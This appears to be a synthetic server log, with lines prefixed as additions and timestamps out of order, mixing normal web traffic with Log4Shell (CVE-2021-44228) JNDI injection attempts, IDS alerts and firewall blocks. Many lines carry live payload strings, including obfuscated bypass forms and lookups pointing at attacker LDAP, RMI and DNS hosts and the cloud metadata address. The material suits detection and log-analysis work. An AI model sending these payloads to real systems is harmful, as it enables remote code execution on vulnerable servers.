+2024-12-20 11:18:30 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 207 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:42:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:40:00 catalina.out: JNDI lookup for [${jndi:ldap://185.220.101.46:389/Payload}] was bound to Reference
+2024-12-20 10:34:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:15:30 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 375 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:16:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 172 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:04:00 103.35.74.12 - - "GET /login?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 277 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:33:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:13:00 198.51.100.50 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:34:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 125 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:04:00 catalina.out: JNDI lookup for [${lower:l${lower:d${lower:a${lower:p}}}:${lower:r${lower:m${lower:i}}}://...] was bound to Reference
+2024-12-20 12:05:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:04:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:08:00 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 247 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:24:00 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 485 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:39:00 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 496 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:32:00 103.35.74.12 - - "GET /api/search?q=${jndi:ldap://192.168.1.100:1389/Exploit} HTTP/1.1" 200 267 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:17:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 247 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 12:00:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:12190 payload=${jndi:ldap://...}
+2024-12-20 10:31:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 385 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:17:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 361 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:59:00 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 130 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 11:25:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 23.129.64.213:33526 payload=${jndi:ldap://...}
+2024-12-20 11:26:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 91 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+Dec 20 11:00:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:37993 payload=${jndi:ldap://...}
+2024-12-20 10:57:00 185.220.101.46 - - "GET /api/search?q=${jndi:ldap://evil.com/Exploit} HTTP/1.1" 200 176 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:15:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:31:00 10.0.0.50 - - "GET /static/main.js HTTP/1.1" 200 359 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:17:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:06:00 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 374 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:04:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 496 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:19:30 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 142 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:05:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 477 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:24:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:02:30 198.51.100.50 - - "GET /admin?q=${jndi:rmi://127.0.0.1:1099/Object} HTTP/1.1" 200 244 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:15:00 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 249 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 11:10:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:16509 payload=${jndi:ldap://...}
+2024-12-20 10:27:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 475 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:10:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:26:30 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 132 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:39:30 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 308 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:42:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:53:00 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 394 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:22:30 198.51.100.50 - - "GET /api/user?q=${jndi:ldap://attacker.com/a} HTTP/1.1" 200 137 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:25:00 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 250 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:48:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:48:30 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 158 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 12:00:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:11:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 145 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:31:30 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 238 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:45:00 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 211 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:01:30 23.129.64.213 - - "GET /admin?q=${jndi:ldap://10.0.0.5:389/o=tomcat} HTTP/1.1" 200 297 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:08:00 103.35.74.12 - - "GET /login?q=${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64} HTTP/1.1" 200 318 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:00:30 103.35.74.12 - - "GET /api/search?q=${jndi:ldap://10.0.0.5:389/o=tomcat} HTTP/1.1" 200 465 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:36:30 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 97 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:20:00 192.168.1.100 - - "GET /static/main.js HTTP/1.1" 200 188 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:09:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:14:00 91.121.87.18 - - "GET /admin?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 495 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:22:00 91.121.87.18 - - "GET /admin?q=${jndi:ldap://10.0.0.5:389/o=tomcat} HTTP/1.1" 200 433 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:12:00 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 403 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:58:00 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 492 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:30:00 192.168.1.100 - - "GET /static/main.js HTTP/1.1" 200 398 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:45:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:22:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 491 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:35:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 384 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:46:00 192.168.1.101 - - "GET /api/products HTTP/1.1" 200 385 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:57:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 489 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:20:00 198.51.100.50 - - "GET /login?q=${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64} HTTP/1.1" 200 236 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 11:35:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:37512 payload=${jndi:ldap://...}
+Dec 20 10:30:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:28322 payload=${jndi:ldap://...}
+Dec 20 11:50:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 185.220.101.46:32376 payload=${jndi:ldap://...}
+2024-12-20 10:15:30 catalina.out: Loaded remote class: com.sun.jndi.ldap.LdapCtx
+2024-12-20 11:30:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:52:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 429 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:05:30 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 352 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:28:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 410 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:30:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:16:30 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 216 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:52:00 192.168.1.100 - - "GET /static/main.js HTTP/1.1" 200 177 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:50:30 catalina.out: JNDI lookup for [${jndi:rmi://198.51.100.50/Exploit}] was bound to Reference
+2024-12-20 11:23:00 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 339 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:51:00 103.35.74.12 - - "GET /login?q=${lower:l${lower:d${lower:a${lower:p}}}:${lower:r${lower:m${lower:i}}}://... HTTP/1.1" 200 104 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:36:30 10.0.0.50 - - "GET /api/login HTTP/1.1" 200 227 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:45:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:35:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:28:00 103.35.74.12 - - "GET /login?q=${jndi:ldap://169.254.169.254/latest/meta-data} HTTP/1.1" 200 412 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:10:00 103.35.74.12 - - "GET /api/user?q=${jndi:ldap://192.168.1.100:1389/Exploit} HTTP/1.1" 200 156 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:13:30 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 278 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:37:00 catalina.out: JNDI lookup for [${jndi:ldap://192.168.1.100:1389/Exploit}] was bound to Reference
+2024-12-20 10:22:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:24:30 198.51.100.50 - - "GET /api/search?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://... HTTP/1.1" 200 128 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:09:30 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 388 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:39:30 103.35.74.12 - - "GET /api/search?q=${jndi:rmi://127.0.0.1:1099/Object} HTTP/1.1" 200 264 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:41:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 444 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:05:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:16:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:56:30 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 234 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:25:30 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 335 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:14:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 374 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 11:05:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:16735 payload=${jndi:ldap://...}
+2024-12-20 10:55:00 185.220.101.46 - - "GET /api/user?q=${jndi:rmi://attacker.com/CallBack} HTTP/1.1" 200 301 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:49:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:34:00 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 260 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:41:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+Dec 20 10:45:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:52176 payload=${jndi:ldap://...}
+2024-12-20 10:50:00 185.220.101.46 - - "GET /api/user?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 156 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:00:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 481 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:39:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:26:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 285 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:18:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 325 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:07:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:02:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:02:00 198.51.100.50 - - "GET /api/user?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 178 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:36:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:36:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:31:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:38:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 433 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:03:30 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 430 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:27:00 198.51.100.50 - - "GET /api/search?q=${jndi:ldap://185.220.101.46:389/Payload} HTTP/1.1" 200 171 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 12:20:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:11:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 273 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:04:00 23.129.64.213 - - "GET /api/search?q=${lower:l${lower:d${lower:a${lower:p}}}:${lower:r${lower:m${lower:i}}}://... HTTP/1.1" 200 457 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 12:15:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:44:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 228 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:33:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 114 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:03:00 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 106 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:13:00 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 131 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:20:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+Dec 20 11:45:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:50891 payload=${jndi:ldap://...}
+2024-12-20 10:54:30 192.168.1.101 - - "GET /api/products HTTP/1.1" 200 193 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:28:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 56 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:01:00 catalina.out: JNDI lookup for [${jndi:ldap://192.168.1.100:1389/Exploit}] was bound to Reference
+2024-12-20 10:02:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 214 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:15:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:08:30 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 421 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:36:00 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 351 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:30:00 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 473 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:25:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:01:00 10.0.0.50 - - "GET /static/main.js HTTP/1.1" 200 324 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:21:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:32:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:48:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:27:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 392 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 10:05:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 23.129.64.213:56385 payload=${jndi:ldap://...}
+Dec 20 11:20:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:59171 payload=${jndi:ldap://...}
+2024-12-20 11:18:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 399 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:21:00 45.154.255.147 - - "GET /login?q=${jndi:ldap://185.220.101.46:389/Payload} HTTP/1.1" 200 207 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:06:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:38:00 198.51.100.50 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:27:30 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 182 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+Dec 20 11:15:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:44214 payload=${jndi:ldap://...}
+Dec 20 12:25:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:36152 payload=${jndi:ldap://...}
+2024-12-20 11:07:30 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 356 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
